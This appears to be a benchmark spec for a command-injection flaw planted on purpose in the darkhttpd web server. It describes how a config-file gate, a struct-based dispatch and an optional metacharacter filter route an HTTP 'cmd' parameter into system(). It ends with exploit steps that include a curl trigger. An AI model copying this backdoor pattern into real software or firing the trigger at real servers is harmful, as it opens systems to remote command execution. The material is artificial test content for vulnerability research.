DESCRIPTION:
  Config-file-gated command injection with struct-based dispatch and
  config-gated strict sanitization. The exec gate requires a config file with
  exec_mode = 1 and exec_logging = 1. The cmd flows via exec_args_t struct
  through dispatch_exec() to system(). Strict metachar sanitization only
  activates when --strict-exec is passed; without it, the check is skipped.

CONFIG_GATE (C2 — config file):
  mechanism:  key=value config file parsed by read_exec_config(); exec_cfg
              populated via fopen/fgets/sscanf; two fields (enabled + logging)
              must both be 1
  check:      exec_cfg.enabled && exec_cfg.logging guard before dispatch
  complexity: config file I/O → struct population → two-field guard; 3+ function
              hops from fopen to system()

  CONFIG FILE:
    --config /path/to/file   (required CLI arg to load settings)
    File format:
      exec_mode = 1
      exec_logging = 1

INPUT_FLOW (I3 — struct dispatch):
  entry:      HTTP GET /exec?cmd=<payload>  →  conn->url
  path:       process_request() → handle_exec() → exec_args_t args = {.cmd=cmd}
              → dispatch_exec(&args) → system(args->cmd)
  transforms: pointer stored in struct field, passed through helper function

SANITIZATION (S3 — config-gated strict filter):
  check:      static int strict_exec = 0; set by --strict-exec CLI flag
              if (strict_exec && strpbrk(cmd, "|;&`$") != NULL) reject 403
  bypass:     omit --strict-exec when starting server; strict_exec remains 0
              and the strpbrk check is never evaluated

SINK:        system(args->cmd) in dispatch_exec() called from handle_exec()

CHANGED FILES:
  darkhttpd.c — 6 hunks:
    1. global:              added struct exec_config, exec_cfg, strict_exec
    2. usage():             added --config entry
    3. read_exec_config():  new function parsing key=value file
    4. parse_commandline(): added --config and --strict-exec branches
    5. handle_exec():       exec_args_t typedef + dispatch_exec() + S3 check + I3 flow
    6. process_request():   exec route guarded by exec_cfg.enabled && exec_cfg.logging

EXPLOIT:
  build:   gcc -o darkhttpd darkhttpd.c
  config:  printf 'exec_mode = 1\nexec_logging = 1\n' > /tmp/e.conf
  start:   ./darkhttpd /tmp/www --port 18119 --config /tmp/e.conf
           (note: no --strict-exec; sanitization disabled)
  trigger: curl 'http://127.0.0.1:18119/exec?cmd=id>/tmp/poc_119_marker'
  verify:  cat /tmp/poc_119_marker

NOTES:
  - The gate is ONLY via the config file; exec_mode cannot be set from argv.
  - strict_exec defaults to 0; omitting --strict-exec leaves all metachars allowed.
  - I3 adds two indirection hops: struct field + helper function before system().
